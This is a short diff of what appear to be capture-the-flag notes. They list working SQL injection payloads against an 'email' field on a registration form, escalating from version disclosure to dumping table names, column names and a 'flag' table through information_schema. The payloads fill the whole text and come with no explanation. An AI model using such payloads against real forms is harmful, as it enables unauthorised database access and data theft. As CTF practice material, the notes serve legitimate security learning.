@@ -1,7 +1,11 @@
 Email parameter is injectable:
 
 username=x3tb3t5&password=alex&email=bla');#
+
 username=x3tb3t11&password=alex&email=bla'),('x3tb3t12','alex',@@version);#
+
 username=x3tb3t13&password=alex&email=bla'),('x3tb3t14','alex2',concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)));#
+
 username=x3tb3t15&password=alex&email=bla'),('x3tb3t16','alex2',concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name='flag' limit 0,1)));#
+
 username=x3tb3t17&password=alex&email=bla'),('x3tb3t18','alex2',concat(0x7e,(SELECT concat(flag) FROM flag limit 0,1)));#
